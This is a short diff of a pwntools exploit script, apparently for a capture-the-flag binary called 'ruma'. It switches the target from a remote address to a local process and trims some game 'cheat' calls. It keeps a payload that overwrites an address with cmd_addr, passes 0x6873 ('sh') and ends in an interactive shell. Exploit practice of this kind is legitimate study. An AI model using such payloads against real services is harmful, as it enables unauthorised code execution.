@@ -2,8 +2,8 @@ from pwn import *
 
 context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
 
-# p = process('./ruma')
-p = remote("52.78.27.112", 10001)
+p = process('./ruma')
+# p = remote("52.78.27.112", 10001)
 
 script = "b *0x8048b4c\n"
 script += "b *0x8049061\n"
@@ -73,8 +73,6 @@ for i in xrange(0x10):
 
 cheat("game over man")
 
-change_player("AAAAAAAA")
-
 payload = "a" * 7
 payload += p64(cmd_addr)
 payload = payload.ljust(0x14, "a")
@@ -84,8 +82,6 @@ cheat(payload)
 buy_item(0x6873)
 
 cheat("power overwhelming")
-
-# cheat("radio free zerg")
 
 p.interactive()
 p.close()
